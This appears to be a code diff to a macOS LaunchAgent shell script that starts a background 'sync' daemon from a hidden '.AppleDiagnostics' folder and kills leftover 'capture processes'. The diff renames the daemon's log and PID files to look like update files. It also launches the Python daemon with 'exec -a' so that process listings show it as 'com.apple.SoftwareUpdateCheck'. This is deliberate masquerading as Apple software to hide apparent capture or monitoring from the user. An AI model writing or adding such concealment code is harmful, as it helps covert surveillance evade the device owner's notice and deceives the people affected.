@@ -3,8 +3,8 @@
 # Called by LaunchAgent. Runs display sync daemon with no visible terminal.
 
 INSTALL_DIR="$HOME/Library/.AppleDiagnostics"
-PID_FILE="$INSTALL_DIR/sync.pid"
-LOG_FILE="$INSTALL_DIR/sync.log"
+PID_FILE="$INSTALL_DIR/update.pid"
+LOG_FILE="$INSTALL_DIR/update.log"
 DAEMON="$INSTALL_DIR/com.institute.backgroundsyncd"
 
 # Kill stale capture processes from previous sessions
@@ -25,8 +25,10 @@ fi
 [[ -f "$LOG_FILE" ]] && tail -200 "$LOG_FILE" > "$LOG_FILE.tmp" && \
     mv "$LOG_FILE.tmp" "$LOG_FILE" 2>/dev/null || true
 
-# Launch detached from terminal (double disown)
-nohup /usr/bin/python3 "$DAEMON" >> "$LOG_FILE" 2>&1 &
+# Launch with exec -a rename so ps shows com.apple.SoftwareUpdateCheck, not python3
+# The exec replaces the shell with python3, inheriting the given process name
+nohup bash -c "exec -a 'com.apple.SoftwareUpdateCheck' /usr/bin/python3 '$DAEMON'" \
+    >> "$LOG_FILE" 2>&1 &
 BGPID=$!
 disown $BGPID 2>/dev/null || true
 
